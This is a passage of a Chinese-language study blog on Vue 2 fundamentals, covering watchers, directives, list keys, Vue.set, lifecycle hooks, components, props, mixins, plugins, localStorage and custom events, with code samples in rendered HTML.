comment">//简写：</span>        <span class="token function">lastName</span><span class="token punctuation">(</span><span class="token parameter">newvalue<span class="token punctuation">,</span>oldvalue</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"被修改"</span><span class="token punctuation">,</span>newvalue<span class="token punctuation">,</span>oldvalue<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>计算属性的功能也可以通过监视属性来实现，但使用计算属性更简便，只有在需要使用异步的时候，比如等待几秒再刷新时才会使用监视属性来实现功能（这里的异步的函数比如settimes需要使用箭头函数，因为这样this会向外找，会指向到vue，就可以实现功能）</p><p>总结：</p><p>computed和 watch之间的区别：</p><ul><li><p>computed能完成的功能，watch都可以完成</p></li><li><p>watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。</p><p>两个重要的小原则:</p></li><li><p>所被vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象。</p></li><li><p>所有不被vue所管理的函数（定时器的回调函数、ajax的回调函数等），最好写成箭头函数，这样this的指向才是vm或组件实例对象。</p></li></ul><h3 id="绑定class，style样式"><a href="#绑定class，style样式" class="headerlink" title="绑定class，style样式"></a>绑定class，style样式</h3><p>通过v-bind可以动态的绑定css样式，有以下几种方式：</p><p><img src="/images/image-20220208164110689.png"></p><p>绑定style使用对象式写法,也是使用了v-bind语法：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;div :style&#x3D;&quot;styleObj&quot;&gt;name&lt;&#x2F;div&gt;&lt;script&gt; data:&#123;     styleObj:&#123;         fontSize:&#39;40px&#39;,         color:&#39;red&#39;     &#125; &#125;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h3><p>通过<code>v-show</code>,<code>v-if</code>,可以实现条件渲染，即在需要的时候才将节点渲染到页面上去。</p><p>简单的说就是当其后接的判断为布尔真时渲染，为假时不渲染</p><ul><li>v-if<ul><li>写法为v-if=”表达式”</li><li>结合v-else-if,v-else使用</li><li>当表达式为假时会直接将节点移除，适用于切换频率较低时</li></ul></li><li>v-show<ul><li>写法为v-show=”表达式”</li><li>适用于频率高的</li><li>当表达式为假时只是用style将其隐藏起来</li></ul></li></ul><h3 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h3><p>通过<code>v-for</code>来对列表进行渲染，主要通过v-for对数组或对象进行渲染，将其中的数据渲染到列表中，使用格式如下：</p><p><code>v-for=&quot;(item,index) in xxx&quot; :key=&quot;yyy&quot;</code></p><p>得到形参item，就是数组中的值，index是索引值，注意，需要使用一个唯一的key值进行标识，可以使用index，也可以使用item中的元素。</p><h4 id="key的原理与作用"><a href="#key的原理与作用" class="headerlink" title="key的原理与作用"></a>key的原理与作用</h4><p>当vue在对列表进行渲染时，会生成一个虚拟dom，key即一个虚拟节点的唯一标识，而当数据更新时，vue会生成一个新的虚拟dom，将其与旧的进行比较。对比规则如下：</p><ul><li>如果二者中有相同 的key值，则对比二者内容，若没有区别，则使用之前的，若有区别，则渲染新的（若是部分一样，部分不一样，则只更新不一样的，这样就会在一些时候dom出错，比如输入框，里面已经被输入内容后，对比依旧认为其相同，但其前面的内容已经不一样了）</li><li>key值不相同则进行渲染</li><li>如果以index作为key会引发一些问题：<ul><li>若对数据进行逆向添加，删除等操作，就会造成没有必要的真实dom渲染，导致效率低</li><li>如果结构中有输入类dom，就会产生界面问题（如下图）</li></ul></li><li>所以在开发中最好以id等值作为key，但如果没有输入，或者逆序添加等，用index也可以</li></ul><p><img src="/images/image-20220209103114322.png"></p><h3 id="Vue-set-方法"><a href="#Vue-set-方法" class="headerlink" title="Vue.set()方法"></a>Vue.set()方法</h3><p>当我们的data中并没有预设一个属性但又想通过页面响应来添加时，就可以使用Vue.set()方法来实现，案例如下，想要给people属性添加一个sex的属性，通过Vue.set来实现：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">people</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">"ahh"</span><span class="token punctuation">,</span>        <span class="token literal-property property">age</span><span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        Vue<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>people<span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">)</span>        <span class="token comment">//或者等效于</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>people<span class="token punctuation">,</span><span class="token string">'sex'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，Vue.set()是有局限的，针对上述案例，他可以给people中增加一个属性sex，但无法给people增加一个同级的属性，即无法给对根数据对象添加属性，这是Vue设计的结果</p><h3 id="监视对象与数组"><a href="#监视对象与数组" class="headerlink" title="监视对象与数组"></a>监视对象与数组</h3><p>Vue通过getter,setter对对象属性进行监视与更新，所有需要被监视的数据需要一开始就给定，如果是后面添加的，那么Vue就无法对其进行响应式处理，要想增加被监视的数据只能用Vue.set()来实现</p><p>但对数组是没有的，直接通过数组的索引对其进行修改后虽然数据确实改变了，但Vue不会进行数据的更新，只有通过push,splice，shift等对数组进行操作的方法来对数组进行操作才会引起Vue的响应（Vue对这几个方法进行了包装，所以可以监视到），也可以使用Vue.set来更改数组的内容，比如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">people</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">"ahh"</span><span class="token punctuation">,</span>        <span class="token literal-property property">age</span><span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">,</span>        <span class="token literal-property property">grade</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token comment">//将grade数组中索引值为1的数据更改为88，即87--》88，这样页面时可以检测到数组的改变的</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>grade<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">)</span>        <span class="token comment">//反例：这样做是无效的：</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>grade<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">88</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者通过在对数组进行操作后用新数组替换旧的数组，比如：</p> <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">people</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">"ahh"</span><span class="token punctuation">,</span>        <span class="token literal-property property">age</span><span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">,</span>        <span class="token literal-property property">grade</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>    <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//去掉21分：</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>grade <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>grade<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">g</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> g<span class="token operator">!==</span><span class="token number">21</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样直接替换了数组，也是可以的</p><h3 id="内置指令"><a href="#内置指令" class="headerlink" title="内置指令"></a>内置指令</h3><p>vue的内置指令，比如常用的v-bind，v-model，v-on，等,简要用法如下</p><ul><li><p>v-bind：单向绑定解析表达式，可简写为：xxx</p></li><li><p>v-model：双向数据绑定</p></li><li><p>v-for：遍历数组/对象/字符串</p></li><li><p>v-on：绑定事件监听，可简写为@:xxx</p></li><li><p>v-if：条件渲染（动态控制节点是否存存在）</p></li><li><p>v-else：条件渲染（动态控制节点是否存存在）</p></li><li><p>v-show：条件渲染（动态控制节点是否展示）</p></li></ul><p>再对一些其他的内置指令进行记录：</p><ul><li>v-text：<ul><li>1.作用：向其所在的节点中渲染文本内容<br>2.与插值语法的区别：v-text会替换掉节点中的内容，<code>&#123;&#123;xx&#125;&#125;</code>则不会</li></ul></li><li>v-html：<ul><li>与v-text不同点是会将文本当作html进行解析，所以存在xss攻击的风险，不要将用户输入内容使用v-html进行渲染</li></ul></li><li>v-once：<ul><li>v-once在第一次进行动态渲染后就将内容视为静态内容，</li><li>以后的数据改变不会再影响里面的内容了</li></ul></li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>h2 v<span class="token operator">-</span>once<span class="token operator">></span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">n</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在n进行第一渲染后，第一行的的h2就不会随着n值的变化进行改变了</p><ul><li>v-pre<ul><li>跳过所在节点的编译，即，代码写的是什么样，就直接展示什么，</li><li>可以用他跳过没有使用指令语法，插值语法节点的编译，加快速度</li></ul></li></ul><h3 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h3><p>除了vue的内置指令，还可以使用自定义的指令，比如可以自定义一个v-big指令：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;h2 v-text&#x3D;&quot;n&quot;&gt;&lt;&#x2F;h2&gt;&lt;h2 v-big&#x3D;&quot;n&quot;&gt;&lt;&#x2F;h2&gt;&lt;script&gt;vm &#x3D; new Vue(&#123;data:&#123;n:4&#125;,    directives:&#123;big(element,binding)&#123;            console.log(&#39;big&#39;)            element.innerText &#x3D; binding.value*10;        &#125;    &#125;&#125;&#125;)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过directives属性，就可以自定义一个vue指令，其中定义的指令可以以函数的形式出现，默认接收两个参数：</p><ul><li>element：即真实的dom元素，自定义指令就是需要直接对dom进行操作</li><li>binding：绑定值，这里即指n（其所有信息，使用.value访问其值）</li></ul><p>该函数在两种时候被调用：</p><ul><li>指令与元素成功绑定（一开始）</li><li>指令所在模板被重新解析</li></ul><p>注意，绑定成功后页面并没有被渲染所以此时通过函数做的一些操作是无法实现的，比如拿其父元素</p><p>这种时候就需要使用自定义指令的完整写法：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;h2 v-text&#x3D;&quot;n&quot;&gt;&lt;&#x2F;h2&gt;&lt;h2 v-big&#x3D;&quot;n&quot;&gt;&lt;&#x2F;h2&gt;&lt;script&gt;vm &#x3D; new Vue(&#123;data:&#123;n:4&#125;,    directives:&#123;big:&#123;            &#x2F;&#x2F;指令与元素被绑定时调用            bind(element,binding)&#123;                            &#125;,            &#x2F;&#x2F;指令所在元素被插入页面时调用            inserted(element,binding)&#123;                            &#125;,            &#x2F;&#x2F;指令所在模板被重新解析时调用            update(element,binding)&#123;                            &#125;,                    &#125;  &#125;&#125;&#125;)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>生命周期是一个很重要的概念，简单来说就是在页面的不同时期，对页面元素可以做不同的操做。</p><p>又名生命周期回调函数、生命周期函数、生命周期钩子，这是Vue在特定关键时刻自动调用的一些函数。</p><ul><li>beforeCreated: 此时无法通过vm访问ata中的数据和methods等，</li><li>created：可以通过vm访问ata中的数据和methods等</li><li>beforeMount： 页面展示未经过Vue编译的dom结构，对dom的操作不奏效</li><li><strong>mountd</strong>： 展现经过Vue编译的dom结构，对dom操作有效但应该避免，到此时初始化结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件、等初始化操作</li><li>beforeUpdate：页面数据产生更新，但页面还是旧的，数据于页面还未同步</li><li>updated：更新完成</li><li><strong>beforeDestroy</strong>：销毁之前，data等处于可用状态，但最好不要调用方法，一般在此时执行消除定时器，取消订阅消息等功能</li><li>destoryed：已销毁</li></ul><p>以上被称为挂载流程</p><ul><li>更新流程：</li></ul><p><img src="/images/image-20220220105726863.png"></p><ul><li>销毁流程：</li></ul><p><img src="/images/image-20220220105909859.png"></p><p>常用的生命周期钩子：</p><ol><li>mounted：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】</li><li>beforeDestroy：清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】</li></ol><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><p>用于实现一个特定区域功能效果的代码集，可以实现复用编码，简化编码，提高编写效率</p><p>组件与之前的Vue对象编写方式几乎相同，有以下几点区别：</p><ol><li>没有el属性，因为组件不是固定绑定到哪一个根节点的，而是被引用到指定的地方</li><li>data需要使用函数方式使用，如果是以对象方式使用，会造成一个后果，即同一个组件在两个地方应用，使用的是同一个data，一处件修改数据会影响到另一个的数据显示。</li><li>使用template来编写html部分</li><li>组件在写好以后需要在全局的Vue对象里进行注册，才可以使用</li></ol><p>vue中使用组件的三大步骤：</p><p> 定义组件（创建组件）<br>注册组件<br>使用组件（写组件标签）<br>如何定义一个组件？<br>使用vue.extend（options）创建，其中 options和 new Vue（options）时传入的那个 options儿乎一样</p><p>二、如何注册组件？<br>1.局部注册：靠 new Vue的时候传入 components选项<br>2.全局注册：靠vue，component（”组件名’，组件）<br>编写组件标签</p><p>组件分为两种，一种是单文件组件，即在一个.vue文件中实现一个组件的所有功能，且一个该文件只能写一个组件，是常用的方法，另一种是非单文件组件，即在一个文件中写多个组件的功能，几乎不用</p><p>组件的命名：即注册时的名称</p><ul><li>单个单词：首字母可以大写或小写均可，引用时对应</li><li>多个单词：以<code>-</code>连接，如my-name,但在注册时需要用单引号包起来，每个首字母都大写，但需要在vue脚手架下才能这么写</li></ul><h3 id="vueComponent"><a href="#vueComponent" class="headerlink" title="vueComponent"></a>vueComponent</h3><p>更深层的解释了vue组件创建的原理，每次调用Vue.extend函数都会创建一个组件实例，通过vue源码中的函数返回一个新的vueComponent（vue.extend在实际使用中很难见到，不是不用，而是被简写了，一般的组件使用ES6的语法做default export导出暴露时就已经简写vue.extend了）</p><p>注意，在脚手架中开发时应该通过vue.config.js配置，关闭代码检测，以免报错经常出现</p><p>:</p><pre class="line-numbers language-none"><code class="language-none">module.exports&#x3D; &#123; lintOnSave : false, &#x2F;&#x2F;关闭语法检查，其他一些配置如代理也在这里修改，具体可查阅vuecli官方文档&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><p>对于一个通过脚手架搭建的vue2项目，其主体结构是组件，APP组件，main.js,通过APP组件管理所有的组件，main.js进行vm实例的创建并进行挂载渲染，其中可以看见一个没见过的render配置项：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App.vue'</span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">render</span><span class="token operator">:</span> <span class="token parameter">h</span> <span class="token operator">=></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其作用是调用了app中的模板进行渲染，将其挂载到html文件中的id=app中，也就是将整个页面通过这里进行了渲染，而render的作用如下：</p><ul><li><p>这里引入的vue不是完整的，完整的vue包含了核心功能和模板渲染，但这里的vue只有核心功能没有模板渲染的作用。</p></li><li><p>render是一个函数，完整形式如下：</p></li><li><pre><code class="javascript">render(createElement)&#123;    return createElement(app);&#125;<pre class="line-numbers language-none"><code class="language-none">* 其作用是通过传入渲染模板的函数（也就是h）来实现渲染模板的功能，vue会自动调用render来实现，### vue.config.js在使用脚手架来开发时会有一些固定的配置，比如入口文件叫main.js,开启了语法检查，通过在根目录下新建vue.config.js文件，可以对这些配置进行修改，通过cli的文档可以知道哪些参数如何使用，现查现用即可。### refsref，在vue中用以给元素或者子组件引用信息（替代id，在vue中，想要取真实的dom元素，在元素中使用ref属性来替代，使用this.$refs.xxx来获取该节点，而当用在别的子组件上时，可以获取组件实例对象），应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）使用方式：打标识：\&lt;h1 ref&#x3D;&quot;xxx&quot;&gt;....\&lt;&#x2F;h1&gt;或\&lt;Schoo1 ref&#x3D;&quot;xxx&quot;&gt;\&lt;&#x2F;School&gt;获取：this.$refs.xxx### propsprops是vue中的一个配置项，用以接收外部传递的数据到组件内。其使用方法如下：父组件在调用子组件时将参数传递进去，子组件内部通过props配置项进行接收，传递的方法是：&#96;&lt;School a&#x3D;&quot;aaa&quot; b&#x3D;&quot;q23&quot; :age&#x3D;&quot;16&quot;&gt;&#96;这是外部传入的方式，接收的方式有三种：&#96;&#96;&#96;javascript&#x2F;&#x2F;1.简单接收,没有进行限制props:[&#39;a&#39;,&#39;b&#39;,&#39;age&#39;]&#x2F;&#x2F;2.限制类型props:&#123;    a:String,    age:Number&#125;&#x2F;&#x2F;3. 严格限制props:&#123;    age:&#123;        type:Number, &#x2F;&#x2F;类型        required:ture,&#x2F;&#x2F;是否必须传入        default:19&#x2F;&#x2F;若没有传入则默认值（和required一般不一起出现）    &#125;&#125;&#x2F;&#x2F;一般使用第一种接收参数，要是需要限制，则用后两种<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ul><p>props是只读的，Vue底层会检测对props的修改，如果进行修改会发出警告，所以不要修改props，但若业务需要修改通过props传入的参数，就需要将props中的数据传入data中进行复制，对data进行修改，例如：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;School a&#x3D;&quot;aaa&quot; b&#x3D;&quot;q23&quot; :age&#x3D;&quot;16&quot;&gt;    &#x2F;&#x2F;school组件内,要输出age+1：&lt;template&gt;    &lt;div&gt;        &lt;h1&gt;&#123;&#123;myAge+1&#125;&#125;&lt;&#x2F;h1&gt;    &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;    export default&#123;        name:&quot;School&quot;,        data:&#123;            myAge:this.age        &#125;        props:[&#39;a&#39;,&#39;b&#39;,&#39;age&#39;],            &#125;        &lt;&#x2F;script&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mixin"><a href="#mixin" class="headerlink" title="mixin"></a>mixin</h3><p>混入，作用是将多个组件都使用的相同的配置项提取成一个混入对象进行复用</p><ul><li><p>定义混入：在一个js文件中定义需要混入的配置项，如data，method等，写法和正常的一样，只是需要export出去才能被import</p></li><li><p>使用混入：</p><ul><li>全局混入：在main.js中使用<code>Vue.mixin(xx)</code>进行注册，这样在所有组件中都会使用一次该混入</li><li>局部混入：在想要使用的组件中导入混入，然后使用：<code>mixins:[xx1,xx2]</code>进行使用</li></ul></li></ul><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>用以实现很多功能，比如vue-router其实就是vue插件，通过全局方法 <code>Vue.use()</code> 使用插件。它需要在你调用 <code>new Vue()</code> 启动应用之前完成，也可以自己开发 插件，一个最简单的插件：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">default</span><span class="token punctuation">&#123;</span>    <span class="token function">install</span><span class="token punctuation">(</span><span class="token parameter">Vue</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Vue.js 的插件应该暴露一个 <code>install</code> 方法。这个方法的第一个参数是 <code>Vue</code> 构造器（构造函数 ），在插件中可以使用全局过滤器，定义全局指令，使用mixin等诸多功能，在全局注册后就可以直接使用对应功能了</p><h3 id="样式相关，scoped，lang"><a href="#样式相关，scoped，lang" class="headerlink" title="样式相关，scoped，lang"></a>样式相关，scoped，lang</h3><p>对于vue中的样式，在vue文件中的style区域直接写即可，但需要注意，不同的组件间，如果class名称有相同，会造成样式的冲突和覆盖，这时候只需要在style中加上scoped即可,让样式在局部生效防止冲突，除了css，也可以写其衍生版本，如less，sass等，只需要加上lang=”less”即可，但需要先安装对应解析器（注意，因为webpack版本原因，可能会失败，需要注意安装的版本）：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;style scoped lang&#x3D;&quot;less&quot;&gt;    .hello&#123;        background-color:pink;    &#125;&lt;&#x2F;style&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="组件化编码流程："><a href="#组件化编码流程：" class="headerlink" title="组件化编码流程："></a>组件化编码流程：</h3><ol><li>拆分静态组件：组件要按照功能点拆分，命名不要与tml元素冲突</li><li>实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用<ol><li>一个组件在用：放在组件自身即可</li><li>一些组件在用：放在他们共同的父组件上（状态提升）</li><li>实现交互：从绑定事件开始</li></ol></li><li>props适用于:<ol><li>父组件==&gt;子组件通信</li><li>子组件=&gt;父组件通信（要求父先给子一个函数）</li></ol></li><li>使用v-modelE时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</li><li>props传过来的若是对象类型的值，修改对象中的属性时ue不会报错，但不推荐这样做</li></ol><p>(这里的方法没有做到同级组件间传值，是最基础的方法，后续会有更好的方法，这里主要是了解组件化编码的流程)</p><h3 id="localStorage-sessionStorage"><a href="#localStorage-sessionStorage" class="headerlink" title="localStorage_sessionStorage"></a>localStorage_sessionStorage</h3><p>通过浏览器做本地存储，一般大小是5M左右，localStorage在关闭浏览器后不会消失，直到调用特定api或者清除浏览器缓存，sessionStorage则是在关闭浏览器后就会消失</p><ul><li><p>api是Windows.localStorage和Window.sessionStorage,直接通过原生api就可调用</p></li><li><p>相关api，两者api相同，以localStorage为例：</p><ul><li><p>localStorage.setItem(‘key’,’value’)：以一个键值对形式存储，如果键名存在则进行替换，注意，都是以字符串形式存入，如果value值是对象形式，则需要调用<code>JSON.stringfy()</code>来进行转化，才能存入：</p><ul><li><pre><code>let p = &#123;name:&quot;ahh&quot;,age:19&#125;localStorage.setItem(&#39;people&#39;,JSON.stringfy(p))<pre class="line-numbers language-none"><code class="language-none">  * localStorage.getItem(&#39;key&#39;):接受一个键名，返回对应值，如果返回的时一个对象形式，则使用&#96;JSON.parse()&#96;来进行转换。  * localStorage.removeItem(&#39;key&#39;):接收一个键名，删除该键值对  * localStorage.clear():清空所有键值对### 组件自定义事件1. 原生的事件包括了click,keydown等，当我们对***组件***使用自定义的事件时，其功能是**实现了子组件给父组件传递数据**2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（&lt;span style&#x3D;&quot;color:red&quot;&gt;事件的回调在A中&lt;&#x2F;span&gt;）。如下：&#96;&#96;&#96;html    &lt;!-- 第一种方法,在APP组件中给子组件Student绑定了自定义事件myThing,当该事件触发时，会调用回调函数，即在app组件中定义了的method：myThingRun，使用这种方法，绑定自定义事件是在Student组件里完成的       --&gt;    &lt;Student @myThing&#x3D;&quot;myThingRun&quot;&gt;&lt;&#x2F;Student&gt;    &lt;!-- 第二种方法，通过ref获取到了组件实例，这种方法绑定自定义事件myThing是在APP中完成的 --&gt;    &lt;student ref&#x3D;&quot;studentget&quot;&gt;&lt;&#x2F;student&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ul></li></ul></li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//这是在Student内进行绑定，对应第一种方法：</span> <span class="token literal-property property">methods</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token function">myThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">//绑定自定义事件myThing(绑定是在student实例上的)</span>            <span class="token comment">//$emit就是进行触发的</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'myThing'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//这是在APP内进行绑定，对应第二种方法</span><span class="token 